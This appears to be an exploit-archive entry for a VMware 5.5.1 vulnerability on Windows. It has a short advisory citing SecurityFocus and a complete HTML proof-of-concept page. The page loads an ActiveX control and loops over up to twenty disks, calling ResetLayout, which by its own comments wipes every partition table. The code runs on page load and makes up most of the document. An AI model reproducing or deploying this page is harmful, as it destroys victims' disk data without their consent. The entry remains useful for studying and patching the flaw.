@@ -1,0 +1,36 @@
+source: http://www.securityfocus.com/bid/19551/info
+
+VMware is prone to a remote denial-of-service vulnerability.
+
+An attacker can exploit this issue to destroy partition tables on the affected computer and to deny service to legitimate users.
+
+This issue affects VMware version 5.5.1; other versions may also be vulnerable for Windows.
+
+ =============== vmware.htm start ================
+ <!--
+ // VMware 5.5.1 for Windows arbitrary partition table delete issue.
+ // Tested on Windows Server 2000/2003
+ //
+ // nop nop#xsec.org
+ // http://www.xsec.org
+ //
+ // CLSID: {0F748FDE-0597-443C-8596-71854C5EA20A}
+ // Info: Vie2Locator Class
+ // ProgID: VieLib2.Vie2Locator.1
+ // InprocServer32: C:\Program Files\Common Files\VMware\VMware Virtual
+ Image Editing\vielib.dll
+ --!>
+ <html><body>
+ <object classid="clsid:{0F748FDE-0597-443C-8596-71854C5EA20A}"
+ id="vmware"> </object>
+ <script>
+ var disk = 0; // HardDisk No
+ while (disk < 20)
+ {
+ var x = vmware.ConnectDisk(disk); // Connect to HardDisk
+ x.ResetLayout(); // Will clean all partition table on your Harddisk
+ disk += 1;
+ }
+ </script>
+ </body></html>
+ =============== vmware.htm end ==================
